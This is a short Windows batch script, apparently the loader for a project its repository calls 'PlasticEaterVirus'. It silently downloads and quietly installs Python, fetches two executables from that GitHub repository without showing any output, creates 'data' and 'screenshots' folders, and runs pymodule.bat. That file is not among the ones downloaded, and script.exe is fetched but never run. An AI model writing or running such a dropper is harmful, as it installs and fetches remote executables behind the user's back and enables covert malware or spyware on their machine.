@ECHO OFF
c:
cd C:\PlasticEater
curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
pythonInstaller.exe /quiet
curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.exe -L -O -s
curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/pymodule.exe -L -O -s
mkdir data
mkdir screenshots
pymodule.bat
